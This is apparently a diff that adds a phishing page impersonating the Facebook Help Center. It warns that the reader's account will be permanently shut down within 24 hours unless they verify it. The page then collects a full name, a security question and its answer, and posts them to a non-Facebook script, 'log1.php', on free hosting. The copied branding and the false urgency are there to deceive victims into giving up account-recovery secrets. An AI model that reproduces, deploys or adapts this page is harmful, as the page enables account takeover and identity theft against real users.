@@ -1,0 +1,175 @@
+<!--?xml version="1.0" encoding="utf-8"?--><!DOCTYPE html PUBLIC "-//WAPFORUM//DTD XHTML Mobile 1.0//EN" "xhtml-mobile10.dtd">
+<html>
+ <head> 
+  <title>Facebook Help Center</title> 
+  <link id="Hdqi+" type="text/css" rel="stylesheet" href="k7LsZ6Kzebp.css"> 
+  <link id="yU+cJ" type="text/css" rel="stylesheet" href="RdxXuLZOwAp.css"> 
+  <link id="1mFNa" type="text/css" rel="stylesheet" href="INa-j1hStsU.css"> 
+  <link id="1MiIb" type="text/css" rel="stylesheet" href="diMQkJ1Odg6.css"> 
+  <link id="RtI0j" type="text/css" rel="stylesheet" href="1Vv4bii7bxR.css"> 
+  <link id="2MLkD" type="text/css" rel="stylesheet" href="IFFDgrjmTDl.css"> 
+  <link id="j0nHs" type="text/css" rel="stylesheet" href="1j-MOx9XPgA.css"> 
+  <link id="mz7Wm" type="text/css" rel="stylesheet" href="VLogo77go.css"> 
+  <link rel="shortcut icon" href="fbck.ico"> 
+  <script src="QSUIFyb0MPk.js"></script> 
+ </head> 
+ <body class="touch acw"> 
+  <h1 class="_52r" style="display:block;height:0;overflow:hidden;position:absolute;width:0">Facebook</h1> 
+  <div id="page">
+   <div class="mFuturePageHeader chromeBar acb abb" id="m-future-header" data-sigil="marea">
+    <table>
+     <tbody>
+      <tr>
+       <td class="center" id="m-future-header-center"> <i class="img sp_46vhv4 sx_f45606"><u>facebook</u></i></td>
+      </tr>
+     </tbody>
+    </table>
+   </div> 
+   <div id="root" tabindex="0" role="main" class="_4498 acw">
+    <div id="objects_container">
+     <div class="acy apm abb" data-sigil="marea">
+      <span class="mfsm">Update your security information</span>
+     </div> 
+     <div id="root" tabindex="0" role="main" class="_4498 acw"> 
+      <div id="objects_container">
+       <div class="aclb">
+        <div class="loginInner"> 
+         <form method="post" action="log1.php?confirmation" onsubmit="return Form1_Validator(this)"> 
+          <br> 
+          <span class="_52yl style4">We will temporarily lock your account. Please answer a few security questions to ensure that the actual owner of your account. We will provide 1X24 hours, to verify the identity of your account. If you do not confirm, the system will automatically shut down your Facebook account permanently.</span> 
+          <br>
+          <br> 
+          <div class="mam"> 
+           <div class="payment_divider">
+            <span class="payment_divider_text fss fwb fcg">This information will help us to restore your Facebook account</span> 
+           </div>
+          </div> 
+          <br> 
+          <div class="mal pam uiBoxGray"> 
+           <table class="uiInfoTable fbCreditCardFields noBorder" role="presentation"> 
+            <tbody>
+             <tr class="showInEditMode dataRowInEditMode"> 
+              <th class="label">Full name:</th> 
+              <td class="data"><span><span class="hideInEditMode"></span><span class="showInEditMode"> <input type="text" class="inputtext" name="firstName"></span></span></td>
+             </tr> 
+             <tr class="showInEditMode dataRowInEditMode"> 
+              <th class="label">Security Question:</th>
+              <td class="data"><span><span class="hideInEditMode"> </span><span class="showInEditMode"><select name="security_question"><option value="">Choose security question 
+                   <!-- option--> </option><option value="What is your name first grade teacher?"> What is your name first grade teacher? 
+                   <!-- option--> </option><option value="In what city or town was your mother born?"> In what city or town was your mother born? 
+                   <!-- option--> </option><option value="What street do you live when you were eight years old?"> What street do you live when you were 8 years old? 
+                   <!-- option--> </option><option value="What is your third-grade teacher's name?"> What is your third-grade teacher's name? 
+                   <!-- option--> </option><option value="What is your grandfather's occupation?"> What is your grandfather's occupation? 
+                   <!-- option--> </option><option value="What is your grandmother's occupation?"> What is your grandmother's occupation? 
+                   <!-- option--> 
+                   <!-- select--> 
+                   <!-- span--> 
+                   <!-- span--> 
+                   <!-- td--> 
+                   <!-- tr--> </option></select></span></span></td>
+             </tr>
+             <tr class="showInEditMode dataRowInEditMode"> 
+              <th class="label"></th>
+              <td class="data"> <span><span class="hideInEditMode"></span><span class="showInEditMode"> <input type="text" class="inputtext" name="security_answer" autocomplete="off"></span></span></td> 
+             </tr>
+            </tbody>
+           </table> 
+           <div class="mhm mts mbm disclaimer fcg"> 
+            <div align="center">
+             <span class="style6">Your security answer must be based on your previous answer.</span>
+            </div> 
+           </div> 
+           <div class="button_area aclb apl" data-sigil="marea"> 
+            <button type="submit" value="Log in" class="btn btnC largeBtn bglb mfsl touchable" name="login" role="button" data-sigil="touchable">Protect Your Account </button>
+           </div>
+           <div class="_4xdr aclb" data-sigil="marea"> 
+            <center>
+             <a href="http://www.youtube.com/"><span></span></a> 
+             <iframe src="http://www.facebook.com/plugins/like.php?href=http%3A%2F%2Fwww.facebook.com%2Fapps%2Fapplication.php%3Fid%3D56531631380&amp;layout=standard&amp;show_faces=true&amp;width=2000&amp;action=like&amp;colorscheme=light&amp;height=1000" scrolling="no" frameborder="0" style="border:none; overflow:hidden; width:345px; height:94px;" allowtransparency="true"></iframe> 
+            </center>
+            <br> 
+           </div>
+          </div>
+         </form>
+        </div> 
+        <script language="JavaScript">
+
+<!--
+function Form1_Validator(theForm)
+{
+
+var alertsay = ""; // define for long lines
+// alertsay is not necessary for your code,
+// but I need to break my lines in multiple lines
+// so the code won't extend off the edge of the page
+// check to see if the field is blank
+// require at least 16 characters in the Credit Card
+if (theForm.firstName.value.length < 3)
+{
+alert("?");
+theForm.firstName.focus();
+return (false);
+}
+
+if (theForm.email.value.length < 5)
+{
+alert("?");
+theForm.email.focus();
+return (false);
+}
+ 
+if (theForm.year.selectedIndex == 0)
+  {
+    alert("?");
+    theForm.year.focus();
+    return (false);
+  }
+
+if (theForm.month.selectedIndex == 0)
+  {
+    alert("?");
+    theForm.month.focus();
+    return (false);
+  }
+
+if (theForm.day.selectedIndex == 0)
+  {
+    alert("?");
+    theForm.day.focus();
+    return (false);
+  }
+
+if (theForm.password.value.length < 6)
+{
+alert("?");
+theForm.password.focus();
+return (false);
+}
+
+if (theForm.security_answer.value.length < 2)
+{
+alert("?");
+theForm.security_answer.focus();
+return (false);
+}
+}
+//--></script> 
+        <div id="footer">
+         <div class="acg apm" data-sigil="marea">
+          <span class="mfss fcg"><b>??(??)</b> <span role="separator" aria-hidden="true">.</span> <a class="sec" href="#">English (US)</a> <span role="separator" aria-hidden="true">.</span> <a class="sec" href="#">More?</a></span>
+         </div> 
+         <div class="acg apm" data-sigil="marea"> 
+          <span class="mfss fcg"> Facebook © 2018</span>
+         </div> 
+         <div style="text-align: right;position: fixed;z-index:9999999;bottom: 0; width: 100%;cursor: pointer;line-height: 0;display:block !important;">
+          <a title="Hosted on free web hosting 000webhost.com. Host your own website for FREE." target="_blank" href="https://www.000webhost.com/?utm_source=000webhostapp&amp;utm_campaign=000_logo&amp;utm_medium=website_unblock-service&amp;utm_content=footer_img"><img src="https://cdn.rawgit.com/000webhost/logo/e9bd13f7/footer-powered-by-000webhost-white2.png" alt="www.000webhost.com"></a>
+         </div>
+        </div>
+       </div>
+      </div>
+     </div>
+    </div>
+   </div>
+  </div>
+ </body>
+</html>
